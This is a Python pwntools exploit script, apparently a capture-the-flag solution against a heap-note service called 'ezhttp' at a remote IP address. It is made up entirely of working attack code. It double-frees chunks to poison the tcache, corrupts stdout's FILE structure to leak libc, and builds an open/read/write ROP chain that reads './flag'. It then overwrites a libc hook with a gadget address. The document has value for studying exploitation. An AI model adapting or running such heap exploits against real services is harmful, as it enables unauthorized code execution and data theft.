from pwn import *

#context.log_level="debug"
s="POST /magic Cookie: user=admin token: \r\n\r\n"

def add(note):
    p.sendafter("========\n",s.replace("magic","create")+"content="+note)

def delete(index):
    p.sendafter("========\n",s.replace("magic","del")+"index="+str(index))

def edit(index,note):
    p.sendafter("========\n",s.replace("magic","edit")+"index="+str(index)+"&content="+note)
for i in range(20):
	try:
		#p=process("./ezhttp")
		p=remote("183.129.189.61",55902)
		add("a"*0xf0)
		p.recvuntil("Your gift: ")
		heap_addr=int(p.recvuntil("\"")[:-1],16)
		for i in range(2):
		    add("a"*0xf0)
		add("d"*0x28)#3
		for i in range(7):
		    delete(1)
		delete(0)
		add("b"*0xd0)#4
		edit(4,"b"*0xa0+p64(heap_addr)+"\n")
		add("b"*8+"\x60\xd7")#5
		print hex(heap_addr)
		delete(3)
		delete(3)
		delete(3)
		delete(3)
		add("a"*0x28)
		edit(6,p64(heap_addr+0x555555758348-0x555555758260)+"\n")
		add("b"*0x28)
		add("c"*0x28)
		add(p64(0x61616161fbad1887)+"a"*0x20)
		edit(9,p64(0xfbad1887) + p64(0)*3 + "\x00"+"\n")
		libc=u64(p.recvuntil("\x7f")[-6:]+"\x00\x00")-0x7fd24922e8b0+0x7fd248e41000
		print hex(libc)
		add("e"*0xf0)
		rsi=libc+0x023e8a
		rdi=libc+0x2155f
		rdx=libc+0x1b96
		payload=p64(heap_addr+0x70)+p64(rsi)+p64(0)+p64(libc+0x10FD50)+p64(rdi)+p64(4)+p64(rsi)+p64(heap_addr+0x200)+p64(rdx)+p64(0x30)+p64(libc+0x110180)+p64(rdi)+p64(heap_addr+0x200)+p64(libc+0x80A30)+"./flag\x00"
		edit(4,payload.ljust(0xa0,"a")+p64(heap_addr)+p64(libc+0x2155f)+"\n")
		add("a"*0x18)
		#gdb.attach(p)
		delete(11)
		delete(11)
		delete(11)
		delete(11)
		add("a"*0x18)
		edit(12,p64(libc+0x03ed8e8)+"\n")
		add("b"*0x18)
		print hex(libc+0x52145)
		add(p64(libc+0x52145))
		#gdb.attach(p)
		delete(0)
		print p.recv()
		exit()
		p.interactive()
	except:
		print "no"
